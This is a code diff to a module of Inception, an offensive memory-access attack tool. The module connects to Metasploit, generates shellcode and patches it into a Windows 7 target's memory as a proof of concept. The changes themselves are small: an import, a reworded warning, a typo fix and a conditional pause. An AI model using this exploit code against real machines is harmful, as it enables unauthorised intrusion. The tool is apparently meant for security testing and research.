@@ -25,6 +25,7 @@ from inception import terminal
 from inception.exceptions import InceptionException
 from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
 from inception.memory import Target, Signature, Chunk
+from inception.interfaces.file import MemoryFile
 
 
 IS_INTRUSIVE = True
@@ -220,9 +221,10 @@ def run(opts, memspace):
     # Warning
     term.warn('This module currently only work as a proof-of-concept against '
               'Windows 7 SP1 x86. No other OSes, versions or architectures '
-              'are supported, nor is there any plans of supporting them. If '
-              'you want to change this, send me a wad of cash or a pull '
-              'request on github.')
+              'are supported, nor is there any guarantee that they will be '
+              'supported in the future. If you want to change this, send me a '
+              'wad of cash in unmarked dollar bills or a pull request on '
+              'github.')
 
     # Connect to msf and generate shellcode
     try:
@@ -258,12 +260,14 @@ def run(opts, memspace):
     backup = memspace.patch(address, signature.chunks)
 
     # TODO: Figure out what os & architecture we're attacking and select stage
-    # TFor now, just select x86
+    # For now, just select x86
 
     # Wait to ensure initial stage execution
     term.wait('Waiting to ensure stage 1 execution', 5)
-    input()
-    # TODO: Modify payload exitfunk that is used if the payload fails
+    if isinstance(memspace.interface, MemoryFile):
+        input()
+    # TODO: Modify payload exitfunk that is used if the payload fails -
+    # this is needed for successful kernel exploitation
 
     # --- STAGE 2 ---
     # Concatenate shellcode and payload
